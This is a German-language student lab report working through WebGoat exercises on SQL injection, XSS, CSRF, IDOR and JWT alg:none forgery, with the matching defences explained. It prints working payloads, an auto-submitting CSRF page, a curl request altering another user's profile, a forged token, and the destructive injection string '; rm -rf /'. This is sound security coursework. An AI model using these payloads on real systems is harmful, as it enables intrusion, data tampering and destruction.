# KN-Webgoat-01: OWASP Top 10 – Dokumentation

**Name:** Yannik Scherer | **Klasse:** m183 | **Datum:** 12.06.2026

---

## A) WebGoat starten

WebGoat wurde auf einer AWS EC2-Instanz (Ubuntu) mit Docker gestartet. Port 8080 wurde in der Security Group `m183-sg` nur für die eigene IP freigegeben.

### Ausgefuehrte Befehle

```bash
docker run -d --name webgoat -p 8080:8080 webgoat/webgoat
docker ps
```

### Screenshot: WebGoat-Startseite mit EC2-IP in der URL

![WebGoat Startseite](Screenshot%20WebGoat-Startseite%20mit%20EC2-IP%20in%20der%20URL.png)

Die WebGoat-Startseite ist unter `http://3.92.173.16:8080/WebGoat` erreichbar. Die EC2-IP ist in der URL sichtbar.

### Screenshot: Inbound Rule für Port 8080

![Inbound Rules](Screenshot%20der%20Inbound%20Rule%20f%C3%BCr%20Port%208080.png)

Die Security Group `m183-sg` hat drei Inbound Rules: Port 22 (SSH), Port 8080 (WebGoat) und Port 9000 – alle nur für die eigene IP `194.230.148.188/32`. Das `/32` bedeutet exakt eine IP-Adresse, kein offener Zugang für alle.

---

## B) SQL Injection

### Hintergrund

SQL Injection entsteht, wenn Benutzereingaben ungefiltert direkt in SQL-Abfragen eingefügt werden. Der Angreifer kann dadurch die Abfrage strukturell verändern und Daten lesen, manipulieren oder die Authentifizierung umgehen.

---

### B1 – Login Bypass

**Navigation:** WebGoat → A3 Injection → SQL Injection (intro) → Seite 9

**Verwendeter Payload:**

| Feld | Eingabe |
|------|---------|
| Employee Name | `Smith` |
| Authentication TAN | `' OR '1'='1` |

### Screenshot: B1 – grüne Bestätigung mit Payload

![B1 Login Bypass](Screenshot%20B1%20%28gr%C3%BCne%20Best%C3%A4tigung%20%2B%20Payload%20sichtbar).png)

Das Formular zeigt «You have succeeded» und listet alle User-Datensätze auf. Der Payload `' OR '1'='1` bewirkt, dass die WHERE-Bedingung immer wahr ist.

---

### B2 – Query Chaining

**Navigation:** WebGoat → A3 Injection → SQL Injection (intro) → Seite 12

**Verwendeter Payload:**

| Feld | Eingabe |
|------|---------|
| Employee Name | `Smith` |
| Authentication TAN | `3SL99A'; UPDATE employees SET salary=9999999 WHERE last_name='Smith'; --` |

### Screenshot: B2 – Payload und extrahierte Daten

![B2 Query Chaining](Screenshot%20B2%20%28Payload%20%2B%20extrahierte%20Daten).png)

WebGoat bestätigt: «Well done! Now you are earning the most money.» Das Gehalt von John Smith wurde auf 9999999 gesetzt. Die Tabelle zeigt Smith mit Salary 9999999 gegenüber Bob (83700) und Tobi (77000).

---

### Schriftliche Antworten B

**1. SQL-Statement vor und nach dem Einschleusen**

Originales SQL-Statement:
```sql
SELECT * FROM employees WHERE name='Smith' AND auth_tan='3SL99A'
```

Nach dem Einschleusen des Payloads:
```sql
SELECT * FROM employees WHERE name='Smith' AND auth_tan='3SL99A';
UPDATE employees SET salary=9999999 WHERE last_name='Smith'; --'
```

Die Authentifizierung bei B1 wird umgangen, weil `OR '1'='1'` immer wahr ist und somit alle Zeilen zurückgegeben werden. Die Applikation interpretiert das als erfolgreichen Login, unabhängig davon ob das Passwort stimmt.

---

**2. Prepared Statements**

Prepared Statements trennen SQL-Code von Daten. Der SQL-Befehl wird zuerst kompiliert und vorbereitet, danach werden Benutzereingaben als reine Datenwerte eingefügt – nicht als ausführbarer Code:

```java
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE name=? AND password=?");
ps.setString(1, name);
ps.setString(2, password);
```

Auch wenn der Benutzer `' OR '1'='1` eingibt, wird dieser Wert als literaler String behandelt. Die Datenbank sucht buchstäblich nach einem User mit diesem Namen – SQL Injection ist damit nicht möglich.

---

**3. OWASP Top 10 Kategorie für SQL Injection**

**A03:2021 – Injection.** SQL Injection ist eine der ältesten und gefährlichsten Injection-Schwachstellen und wird in dieser Kategorie zusammen mit anderen Injection-Angriffen geführt.

---

**4. Weitere Injection-Varianten**

- **OS Command Injection:** Benutzereingaben werden als Betriebssystembefehle ausgeführt. Beispiel: Ein Web-Formular, das `ping` aufruft, kann mit `; rm -rf /` missbraucht werden. Die Gefahr: vollständige Kontrolle über das Betriebssystem.
- **LDAP Injection:** Angreifer schleust LDAP-Sonderzeichen in Verzeichnisabfragen ein. Beispiel: Ein Login-Formular mit LDAP kann mit `*` alle Einträge zurückgeben. Die Gefahr: Zugriff auf Verzeichnisdaten oder Authentifizierungsumgehung.

---

## C) Cross-Site Scripting (XSS)

### Hintergrund

XSS entsteht, wenn Benutzereingaben unkodiert auf einer Webseite ausgegeben werden und der Browser sie als ausführbaren JavaScript-Code interpretiert. Ein Angreifer kann dadurch beliebigen Code im Browser des Opfers ausführen.

---

### C1a – Reflected XSS

**Navigation:** WebGoat → Cross Site Scripting → Seite 7 (Try It! Reflected XSS)

**Verwendeter Payload im Kreditkartennummer-Feld:**
```html
<script>alert('Reflected XSS')</script>
```

### Screenshot: C1a – Alert und grüne Bestätigung

![C1a Reflected XSS](Screenshot%20C1a%20Alert%20%2B%20gr%C3%BCne%20Best%C3%A4tigung.png)

Ein Alert-Popup erscheint mit dem Text «Reflected XSS». Der Payload im Kreditkartennummer-Feld ist sichtbar. Das verwundbare Feld ist das Kreditkartennummer-Feld, da dessen Inhalt ungefiltert im HTML-Response zurückgespiegelt wird.

---

### C1b – DOM-based XSS identifizieren

**Navigation:** WebGoat → Cross Site Scripting → Seite 10/11

### Screenshot: C1b – markierte verwundbare Codezeilen

![C1b DOM XSS](Screenshot%20C1b%20markierte%20verwundbare%20Codezeilen.png)

Im JavaScript-Quellcode (`GoatRouter.js`) wurde die verwundbare Route gefunden und `start.mvc#test/` als Antwort eingegeben. Das verwundbare Konstrukt:

```javascript
'test/:param': 'testRoute'
```

Diese Route liest den URL-Parameter direkt aus und schreibt ihn ohne Filterung in den DOM. Da dies vollständig clientseitig passiert, ist es für serverseitige Filter unsichtbar.

---

### C2 – Stored XSS

**Navigation:** WebGoat → (A3) Injection → Cross Site Scripting (stored) → Seite 3

**Verwendeter Payload im Kommentarfeld:**
```html
<script>webgoat.customjs.phoneHome()</script>
```

Der Response-Wert aus der Console (`1944653798`) wurde ins Antwortfeld eingegeben.

### Screenshot: C2 – Alert und grüne Bestätigung

![C2 Stored XSS](Screenshot%20C2%20Alert%20%2B%20gr%C3%BCne%20Best%C3%A4tigung.png)

Die Console zeigt `phoneHome Response is 1944653798` und WebGoat bestätigt: «Herzlichen Glückwunsch! Sie haben diesen Auftrag erfolgreich abgeschlossen.» Der Kommentar wurde dauerhaft gespeichert und bei jedem Seitenaufruf für alle Benutzer ausgeführt.

---

### Schriftliche Antworten C

**1. Unterschied Reflected vs. Stored XSS**

- **Reflected XSS:** Payload wird nicht gespeichert. Er befindet sich in der URL und wird sofort vom Server zurückgespiegelt. Nur wer den manipulierten Link öffnet, ist betroffen. Reichweite: begrenzt.
- **Stored XSS:** Payload wird dauerhaft in der Datenbank gespeichert (z.B. als Kommentar). Bei jedem Seitenaufruf wird der Code für alle Benutzer ausgeführt – auch solche, die selbst nichts eingegeben haben. Deutlich gefährlicher.

---

**2. DOM-based XSS vs. Reflected XSS**

Bei Reflected XSS sendet der Server den Payload im Response zurück – serverseitige Filter können ihn erkennen und blockieren. Bei DOM-based XSS passiert die Injection vollständig im Browser: JavaScript liest einen Wert (z.B. aus `location.hash`) und schreibt ihn ohne Filterung in den DOM. Der Server-Response enthält den Payload gar nicht, weshalb serverseitige Filter ihn nicht erkennen können.

---

**3. Output Encoding**

Output Encoding wandelt Sonderzeichen in ihre HTML-Entsprechungen um, sodass der Browser sie als Text und nicht als Code interpretiert. Beispiel: `<script>` wird zu:
```
&lt;script&gt;alert('XSS')&lt;/script&gt;
```
Der Browser zeigt diesen Text an, führt ihn aber nicht aus. Damit ist XSS wirkungsvoll verhindert.

---

**4. Content-Security-Policy (CSP)**

CSP ist ein HTTP-Header, der dem Browser mitteilt, welche Quellen für Scripts erlaubt sind. Beispiel:
```
Content-Security-Policy: script-src 'self'
```
Damit dürfen nur Scripts von der eigenen Domain ausgeführt werden. Inline-Scripts (wie `<script>alert()</script>`) werden blockiert, selbst wenn ein Angreifer sie einschleusen konnte.

---

**5. OWASP Top 10 Kategorie für XSS**

**A03:2021 – Injection.** XSS ist als Untertyp von Injection klassifiziert, da schadhafer Code in Webseiten eingeschleust wird.

---

## D) CSRF – Cross-Site Request Forgery

### Hintergrund

Bei CSRF bringt ein Angreifer den Browser eines eingeloggten Opfers dazu, im Hintergrund Aktionen auf einer anderen Webseite auszuführen. Der Browser schickt dabei den Session-Cookie automatisch mit.

---

### Analyse der Netzwerk-Anfrage

### Screenshot: DevTools Netzwerk-Anfrage

![CSRF Network](Screenshot%20DevTools%20Netzwerk-Anfrage%20%28URL%2C%20Methode%2C%20Parameter).png)

Die analysierte Anfrage:

| Eigenschaft | Wert |
|-------------|------|
| Request URL | `http://54.81.121.45:8080/WebGoat/csrf/review` |
| Method | POST |
| reviewText | test |
| stars | (leer) |
| validateReq | `2aa14227b9a13d0bede0388a7fba9aa9` |

---

### csrf-attack.html

### Screenshot: Inhalt csrf-attack.html

![CSRF HTML](Inhalt%20csrf-attack.html%20%28Screenshot%20oder%20Code-Block).png)

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Herzlichen Glückwunsch! Sie haben gewonnen!</h1>
  <form id="csrfForm" action="http://54.81.121.45:8080/WebGoat/csrf/review" method="POST">
    <input type="hidden" name="reviewText" value="CSRF Attack!">
    <input type="hidden" name="stars" value="5">
    <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
  </form>
  <script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
```

---

### Ergebnis

### Screenshot: Grüne WebGoat-Bestätigung

![CSRF Success](Screenshot%20gr%C3%BCne%20WebGoat-Best%C3%A4tigung.png)

WebGoat bestätigt: «It appears you have submitted correctly from another site.» Die `csrf-attack.html` wurde lokal geöffnet und hat automatisch einen Kommentar als eingeloggter Benutzer gepostet.

---

### Schriftliche Antworten D

**1. Warum schickt der Browser den Session-Cookie mit?**

Browser schicken Cookies automatisch zu ihrer zugehörigen Domain, egal von welcher Seite die Anfrage stammt. Der Session-Cookie gehört zu `54.81.121.45` – wenn eine Anfrage an diese Domain gestellt wird (auch von einer lokalen HTML-Datei), hängt der Browser den Cookie automatisch an. Das ist das grundlegende Verhalten von Session-Cookies und wird von CSRF missbraucht.

---

**2. Was ist ein CSRF-Token?**

Ein CSRF-Token ist ein zufälliger, geheimer Wert, der bei jeder sensitiven Anfrage mitgeschickt und serverseitig geprüft wird. Er ist im HTML der legitimen Seite eingebettet. Eine Angreifer-Seite kann ihn nicht auslesen, weil die Same-Origin-Policy verhindert, dass fremde Seiten den Inhalt einer anderen Domain lesen. Der Angreifer kennt den Token nicht und kann ihn daher nicht in seine Anfrage einbauen.

---

**3. SameSite=Strict**

Das `SameSite=Strict`-Flag bei einem Cookie bedeutet, dass der Browser diesen Cookie nur bei Anfragen mitschickt, die von derselben Domain stammen. Wenn eine Anfrage von einer anderen Seite (z.B. `csrf-attack.html`) ausgelöst wird, wird der Cookie nicht mitgeschickt. CSRF-Angriffe scheitern, weil ohne Cookie keine gültige Session vorhanden ist.

---

**4. OWASP Top 10 Kategorie für CSRF**

**A01:2021 – Broken Access Control.** CSRF ist dort eingeordnet, da es eine unerlaubte Aktion im Namen eines authentifizierten Benutzers ausführt.

---

## E) Broken Access Control – IDOR

### Hintergrund

IDOR (Insecure Direct Object Reference) tritt auf, wenn eine Applikation Objekte über vorhersehbare IDs anspricht, ohne zu prüfen ob der anfragende Benutzer der Eigentümer ist.

---

### Fremdes Profil lesen

### Screenshot: Fremdes Profil mit sichtbarer Profil-ID

![IDOR Profile](Screenshot%20fremdes%20Profil%20mit%20sichtbarer%20Profil-ID.png)

Durch Eingabe der URL `http://54.81.121.45:8080/WebGoat/IDOR/profile/2342388` wurde das Profil von Buffalo Bill gefunden:

```json
{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}
```

WebGoat bestätigt: «Well done, you found someone else's profile». Die eigene userId war `2342384`, durch Hochzählen wurde die fremde ID `2342388` gefunden.

---

### Fremdes Profil via curl verändern

### Screenshot: Erfolgreiche Veränderung

![IDOR Edit](Screenshot%20Command%20erfolgreiche%20Ver%C3%A4nderung%20%2B%20WebGoat-Best%C3%A4tigung.png)

Auf der EC2-Instanz ausgeführter Befehl:

```bash
curl -X PUT "http://localhost:8080/WebGoat/IDOR/profile/2342388" \
  -H "Cookie: JSESSIONID=F11EC000308B1AD2F56E0BBE95D6C65B" \
  -H "Content-Type: application/json" \
  -d '{"role":0,"color":"red","size":"large","name":"Buffalo Bill","userId":"2342388"}'
```

WebGoat bestätigt: «Well done, you have modified someone else's profile». Das Profil wurde auf `role=0` und `color=red` geändert.

---

### Schriftliche Antworten E

**1. Warum schützt «nicht verlinken» nicht? (Security through Obscurity)**

Wenn eine Ressource nicht verlinkt ist, bedeutet das nicht, dass sie nicht erreichbar ist. Ein Angreifer kann URLs systematisch durchprobieren (Brute Force), aus anderen Quellen erraten oder durch Analyse der API-Muster ableiten. Sicherheit darf nicht darauf basieren, dass etwas «nicht bekannt» ist – das ist Security through Obscurity und kein echter Schutz.

---

**2. Wie hätte die App IDOR verhindern können?**

Die Applikation muss serverseitig bei jeder Anfrage prüfen, ob der eingeloggte Benutzer berechtigt ist, auf das angefragte Objekt zuzugreifen. Beim Aufruf von `/IDOR/profile/2342388` muss der Server vergleichen, ob die userId des eingeloggten Users mit der angeforderten ID übereinstimmt. Falls nicht: Zugriff verweigern (`HTTP 403 Forbidden`).

---

**3. Horizontale vs. vertikale Privilegienerweiterung**

- **Horizontal:** Ein Benutzer greift auf Daten eines anderen Benutzers mit gleicher Rolle zu (User A liest Profil von User B).
- **Vertikal:** Ein Benutzer erhält Rechte einer höheren Rolle (normaler User wird Admin).

Dieses IDOR-Beispiel zeigt **horizontale** Privilegienerweiterung: Als normaler User (yannik) wurde auf das Profil eines anderen normalen Users (Buffalo Bill) zugegriffen und es verändert.

---

**4. OWASP Top 10 A01 – Broken Access Control**

**A01:2021 – Broken Access Control.** Diese Kategorie steht auf Platz 1, weil sie in 94% aller getesteten Applikationen vorkommt – häufiger als jede andere Schwachstelle. Access Control-Fehler sind schwer zu entdecken, da sie oft nicht durch automatische Tests erkannt werden und von der Geschäftslogik abhängen.

---

## F) Broken Authentication – JWT Tokens

### Hintergrund

JWT (JSON Web Token) ist ein Standard für zustandslose Authentifizierungstoken bestehend aus drei Teilen: Header (Algorithmus), Payload (Nutzdaten) und Signatur. Die `alg:none`-Schwachstelle erlaubt es, Token ohne gültige Signatur einzureichen.

---

### Original-Token analysieren

### Screenshot: jwt.io mit Original-Token

![JWT Original](Screenshot%20jwt.io%20mit%20Original-Token%20%28Payload%20%2B%20Algorithmus%20sichtbar).png)

Der Original-Token wurde auf [jwt.io](https://jwt.io) analysiert:

| Teil | Inhalt |
|------|--------|
| Header | `{"alg": "HS512"}` |
| Payload | `{"iat": 1782137446, "admin": "false", "user": "Tom"}` |
| Signatur | Ungültig (kein Secret bekannt) |

---

### alg:none-Angriff

In der Browser-Console wurden neuer Header und Payload Base64url-kodiert:

```javascript
// Neuer Header:
btoa('{"alg":"none"}').replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_')
// → eyJhbGciOiJub25lIn0

// Neuer Payload (admin: true):
btoa('{"iat":1782137446,"admin":"true","user":"Tom"}')
  .replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_')
// → eyJpYXQiOjE3ODIxMzc0NDYsICJhZG1pbiI6InRydWUiLCAidXNlciI6ICJUb20ifQ
```

### Screenshot: Manipulierter Token

![JWT Manipulated](Vollst%C3%A4ndiger%20manipulierter%20Token%20%28Text%20oder%20Screenshot).png)

**Fertiger manipulierter Token:**
```
eyJhbGciOiJub25lIn0.eyJpYXQiOjE3ODIxMzc0NDYsICJhZG1pbiI6InRydWUiLCAidXNlciI6ICJUb20ifQ.
```

Der abschliessende Punkt ist wichtig – er markiert das leere Signatur-Feld.

---

### Ergebnis

### Screenshot: Grüne Bestätigung in WebGoat (Aufgabe F)

![JWT Success](Screenshot%20gr%C3%BCne%20Best%C3%A4tigung%20in%20WebGoat%20Aufgabe%20F.png)

Nach Ersetzen des `access_token`-Cookies und Klick auf Reset bestätigt WebGoat: «Herzlichen Glückwunsch! Sie haben diesen Auftrag erfolgreich abgeschlossen.» Der Server hat den Token ohne Signaturprüfung akzeptiert.

---

### Schriftliche Antworten F

**1. Warum ist alg:none ein Sicherheitsproblem?**

Wenn ein Server `alg:none` akzeptiert, verzichtet er auf jede kryptografische Prüfung des Tokens. Ein Angreifer kann dann den Payload beliebig verändern (z.B. `admin:true` setzen) und einen Token ohne Signatur einreichen. Der Server glaubt, der Token sei legitim, und gewährt die erhöhten Rechte. Die Signatur – der einzige Beweis für die Echtheit des Tokens – wird damit komplett ausgehebelt.

---

**2. Base64url = Kodierung, nicht Verschlüsselung**

Base64url ist eine Kodierung, keine Verschlüsselung. Jeder kann einen JWT-Payload sofort dekodieren und lesen, ohne ein Geheimnis zu kennen. Sensible Daten wie Passwörter oder Kreditkartennummern dürfen daher niemals im JWT-Payload gespeichert werden. Der Payload ist öffentlich lesbar – er ist nur vor Veränderung geschützt (durch die Signatur), nicht vor Einsicht.

---

**3. Gegenmassnahmen gegen JWT-Angriffe**

- **Algorithmus-Whitelist:** Der Server akzeptiert nur vordefinierte, sichere Algorithmen (z.B. nur HS256 oder RS256). `alg:none` wird explizit abgelehnt.
- **Kurze Ablaufzeiten (exp-Claim):** Tokens haben eine kurze Gültigkeitsdauer (z.B. 15 Minuten). Abgelaufene Tokens werden abgelehnt, selbst wenn sie gültig signiert sind.
- **Korrekte Library-Methode:** `parseClaimsJws` statt `parse` verwenden, was eine gültige Signatur erzwingt und keinen unsignierten Token akzeptiert.

---

**4. OWASP Top 10 Kategorie für Broken Authentication**

**A07:2021 – Identification and Authentication Failures.** Diese Kategorie beschreibt Schwachstellen bei der Identifizierung und Authentifizierung von Benutzern, zu der auch fehlerhafte JWT-Implementierungen gehören.